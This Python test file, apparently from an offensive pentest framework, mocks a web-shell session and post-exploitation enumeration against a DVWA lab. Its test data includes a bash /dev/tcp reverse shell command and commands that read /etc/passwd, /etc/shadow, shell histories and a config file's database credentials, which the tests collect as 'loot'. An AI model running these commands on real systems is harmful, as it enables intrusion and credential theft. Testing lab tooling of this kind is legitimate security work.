"""
Tests for WebShellSession and WebShellPostExploit.

All HTTP calls are mocked so no real DVWA instance is needed.
"""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock, patch

import pytest
import httpx

from artasf.core.models import (
    EngagementSession,
    ExploitAttempt,
    ExploitStatus,
    Target,
    Port,
    PortState,
)
from artasf.post.webshell import (
    WebShellPostExploit,
    WebShellSession,
    _resolve_shell_url,
    _parse_os_release,
    _parse_ifaces,
    _parse_php_credentials,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture()
def session() -> EngagementSession:
    t = Target(ip="192.168.56.101")
    t.ports = [Port(number=80, service="http", state=PortState.OPEN)]
    s = EngagementSession(name="test", target_network="192.168.56.0/24")
    s.targets = [t]
    return s


@pytest.fixture()
def cmd_inject_attempt(session: EngagementSession) -> ExploitAttempt:
    target_id = session.targets[0].id
    return ExploitAttempt(
        session_id=session.id,
        vuln_id="v1",
        target_id=target_id,
        step=3,
        module="custom/cmd_inject",
        params={"RPORT": "80", "TARGETURI": "/dvwa/hackable/uploads/shell.php"},
        status=ExploitStatus.SUCCESS,
        output="uid=33(www-data) gid=33(www-data) groups=33(www-data)",
    )


# ---------------------------------------------------------------------------
# _resolve_shell_url
# ---------------------------------------------------------------------------

def test_resolve_shell_url_uses_targeturi(cmd_inject_attempt: ExploitAttempt) -> None:
    url = _resolve_shell_url(cmd_inject_attempt, "192.168.56.101")
    assert url == "http://192.168.56.101:80/dvwa/hackable/uploads/shell.php"


def test_resolve_shell_url_fallback_default(session: EngagementSession) -> None:
    attempt = ExploitAttempt(
        session_id=session.id, vuln_id="v1", target_id=session.targets[0].id,
        step=1, module="custom/cmd_inject", params={}, status=ExploitStatus.SUCCESS,
    )
    url = _resolve_shell_url(attempt, "10.0.0.1")
    assert url.startswith("http://10.0.0.1")
    assert "/dvwa/hackable/uploads/shell.php" in url


def test_resolve_shell_url_upload_uri_fallback(session: EngagementSession) -> None:
    attempt = ExploitAttempt(
        session_id=session.id, vuln_id="v1", target_id=session.targets[0].id,
        step=1, module="custom/cmd_inject",
        params={"UPLOAD_URI": "/uploads/my_shell.php"},
        status=ExploitStatus.SUCCESS,
    )
    url = _resolve_shell_url(attempt, "10.0.0.2")
    assert "my_shell.php" in url


# ---------------------------------------------------------------------------
# Helper parsers
# ---------------------------------------------------------------------------

def test_parse_os_release_extracts_pretty_name() -> None:
    text = 'NAME="Ubuntu"\nVERSION="20.04.6 LTS"\nPRETTY_NAME="Ubuntu 20.04.6 LTS"\n'
    assert _parse_os_release(text) == "Ubuntu 20.04.6 LTS"


def test_parse_os_release_missing_returns_none() -> None:
    assert _parse_os_release("NAME=Alpine\n") is None


def test_parse_ifaces_extracts_non_loopback() -> None:
    text = "inet 127.0.0.1/8 scope host lo\ninet 192.168.56.101/24 brd 192.168.56.255"
    ifaces = _parse_ifaces(text)
    assert ifaces == ["192.168.56.101"]


def test_parse_php_credentials() -> None:
    php = """
    $_DVWA[ 'db_user' ] = 'dvwa';
    $_DVWA[ 'db_password' ] = 'p@ssw0rd';
    """
    pairs = _parse_php_credentials(php)
    assert pairs == [("dvwa", "p@ssw0rd")]


def test_parse_php_credentials_no_match() -> None:
    assert _parse_php_credentials("<?php echo 'hello'; ?>") == []


# ---------------------------------------------------------------------------
# WebShellSession
# ---------------------------------------------------------------------------

def _mock_shell_client(get_side_effect):
    """Return a context manager that patches httpx for WebShellSession tests."""
    from contextlib import ExitStack
    from unittest.mock import patch, AsyncMock, MagicMock

    stack = ExitStack()
    # Patch Timeout so its constructor doesn't run real httpx validation
    stack.enter_context(patch("artasf.post.webshell.httpx.Timeout", return_value=MagicMock()))

    mock_client = AsyncMock()
    mock_client.__aenter__ = AsyncMock(return_value=mock_client)
    mock_client.__aexit__ = AsyncMock(return_value=False)
    mock_client.get = AsyncMock(side_effect=get_side_effect) if callable(get_side_effect) and isinstance(get_side_effect, Exception.__class__) else AsyncMock(return_value=get_side_effect)
    mock_client.get.side_effect = get_side_effect if isinstance(get_side_effect, Exception) else None
    if not isinstance(get_side_effect, Exception):
        mock_client.get = AsyncMock(return_value=get_side_effect)

    stack.enter_context(patch("artasf.post.webshell.httpx.AsyncClient", return_value=mock_client))
    return stack, mock_client


@pytest.mark.asyncio
async def test_webshell_session_run_returns_output() -> None:
    mock_resp = MagicMock()
    mock_resp.text = "uid=33(www-data) gid=33(www-data)\n"

    with patch("artasf.post.webshell.httpx.Timeout", return_value=MagicMock()):
        with patch("artasf.post.webshell.httpx.AsyncClient") as mock_client_cls:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            mock_client.get = AsyncMock(return_value=mock_resp)
            mock_client_cls.return_value = mock_client

            shell = WebShellSession("http://192.168.56.101/shell.php")
            result = await shell.run("id")

    assert "www-data" in result


@pytest.mark.asyncio
async def test_webshell_session_run_timeout_returns_trigger_message() -> None:
    with patch("artasf.post.webshell.httpx.Timeout", return_value=MagicMock()):
        with patch("artasf.post.webshell.httpx.AsyncClient") as mock_client_cls:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            mock_client.get = AsyncMock(side_effect=httpx.ReadTimeout("timeout"))
            mock_client_cls.return_value = mock_client

            shell = WebShellSession("http://192.168.56.101/shell.php")
            result = await shell.run("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")

    assert "timeout" in result


@pytest.mark.asyncio
async def test_webshell_session_is_alive_true() -> None:
    mock_resp = MagicMock()
    mock_resp.text = "artasf_ping"

    with patch("artasf.post.webshell.httpx.Timeout", return_value=MagicMock()):
        with patch("artasf.post.webshell.httpx.AsyncClient") as mock_client_cls:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            mock_client.get = AsyncMock(return_value=mock_resp)
            mock_client_cls.return_value = mock_client

            shell = WebShellSession("http://192.168.56.101/shell.php")
            alive = await shell.is_alive()

    assert alive is True


@pytest.mark.asyncio
async def test_webshell_session_is_alive_false_on_error() -> None:
    with patch("artasf.post.webshell.httpx.Timeout", return_value=MagicMock()):
        with patch("artasf.post.webshell.httpx.AsyncClient") as mock_client_cls:
            mock_client = AsyncMock()
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            mock_client.get = AsyncMock(side_effect=Exception("connection refused"))
            mock_client_cls.return_value = mock_client

            shell = WebShellSession("http://192.168.56.101/shell.php")
            alive = await shell.is_alive()

    assert alive is False


# ---------------------------------------------------------------------------
# WebShellPostExploit.collect — integration-level mock
# ---------------------------------------------------------------------------

_ENUM_RESPONSES = {
    "id":                       "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
    "hostname":                 "dvwa-lab",
    "uname -a":                 "Linux dvwa-lab 5.15.0 #1 SMP x86_64",
    "cat /etc/os-release 2>/dev/null":
        'PRETTY_NAME="Ubuntu 22.04 LTS"\nNAME="Ubuntu"\n',
    "ip addr 2>/dev/null || ifconfig 2>/dev/null":
        "inet 127.0.0.1/8 lo\ninet 192.168.56.101/24 eth0",
    "env 2>/dev/null":          "PATH=/usr/local/sbin:/usr/local/bin",
    "echo artasf_ping":         "artasf_ping",
    "cat /etc/passwd 2>/dev/null":
        "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
    "cat /etc/shadow 2>/dev/null": "",
}

_DVWA_CONFIG = (
    "<?php\n"
    "$_DVWA[ 'db_user' ] = 'dvwa';\n"
    "$_DVWA[ 'db_password' ] = 'p@ssw0rd';\n"
    "?>\n"
)


def _make_run_side_effect(extra: dict[str, str] | None = None) -> AsyncMock:
    responses = dict(_ENUM_RESPONSES)
    if extra:
        responses.update(extra)

    async def _run(command: str) -> str:
        # strip leading/trailing whitespace for matching
        return responses.get(command.strip(), "")

    return _run


@pytest.mark.asyncio
async def test_collect_builds_post_data(
    session: EngagementSession,
    cmd_inject_attempt: ExploitAttempt,
) -> None:
    handler = WebShellPostExploit(session)

    with patch("artasf.post.webshell.WebShellSession") as MockShell:
        shell_inst = AsyncMock()
        shell_inst.run.side_effect = _make_run_side_effect(
            extra={
                "cat /var/www/html/dvwa/config/config.inc.php 2>/dev/null": _DVWA_CONFIG,
                "cat /var/www/dvwa/config/config.inc.php 2>/dev/null": "",
                "cat ~/.bash_history 2>/dev/null | tail -100": "",
                "cat ~/.zsh_history 2>/dev/null | tail -100": "",
            }
        )
        shell_inst.is_alive = AsyncMock(return_value=True)
        MockShell.return_value = shell_inst

        post_data, loot = await handler.collect(cmd_inject_attempt, "192.168.56.101")

    assert post_data.hostname == "dvwa-lab"
    assert "www-data" in (post_data.whoami or "")
    assert post_data.os_info == "Ubuntu 22.04 LTS"
    assert "192.168.56.101" in post_data.network_ifaces
    assert post_data.msf_session_id is None


@pytest.mark.asyncio
async def test_collect_extracts_dvwa_credentials(
    session: EngagementSession,
    cmd_inject_attempt: ExploitAttempt,
) -> None:
    handler = WebShellPostExploit(session)

    with patch("artasf.post.webshell.WebShellSession") as MockShell:
        shell_inst = AsyncMock()
        shell_inst.run.side_effect = _make_run_side_effect(
            extra={
                "cat /var/www/html/dvwa/config/config.inc.php 2>/dev/null": _DVWA_CONFIG,
                "cat /var/www/dvwa/config/config.inc.php 2>/dev/null": "",
                "cat ~/.bash_history 2>/dev/null | tail -100": "",
                "cat ~/.zsh_history 2>/dev/null | tail -100": "",
            }
        )
        shell_inst.is_alive = AsyncMock(return_value=True)
        MockShell.return_value = shell_inst

        _post, loot = await handler.collect(cmd_inject_attempt, "192.168.56.101")

    creds = [i for i in loot if i.type == "credential"]
    assert any("dvwa" in i.value for i in creds), "Expected dvwa DB credential in loot"


@pytest.mark.asyncio
async def test_collect_proceeds_when_shell_ping_fails(
    session: EngagementSession,
    cmd_inject_attempt: ExploitAttempt,
) -> None:
    """Shell not responding to ping should log a warning but not raise."""
    handler = WebShellPostExploit(session)

    with patch("artasf.post.webshell.WebShellSession") as MockShell:
        shell_inst = AsyncMock()
        shell_inst.run.side_effect = _make_run_side_effect(
            extra={
                "cat /var/www/html/dvwa/config/config.inc.php 2>/dev/null": "",
                "cat /var/www/dvwa/config/config.inc.php 2>/dev/null": "",
                "cat ~/.bash_history 2>/dev/null | tail -100": "",
                "cat ~/.zsh_history 2>/dev/null | tail -100": "",
            }
        )
        shell_inst.is_alive = AsyncMock(return_value=False)
        MockShell.return_value = shell_inst

        post_data, _loot = await handler.collect(cmd_inject_attempt, "192.168.56.101")

    # Should still return a PostExploitData object
    assert post_data.target_id == cmd_inject_attempt.target_id
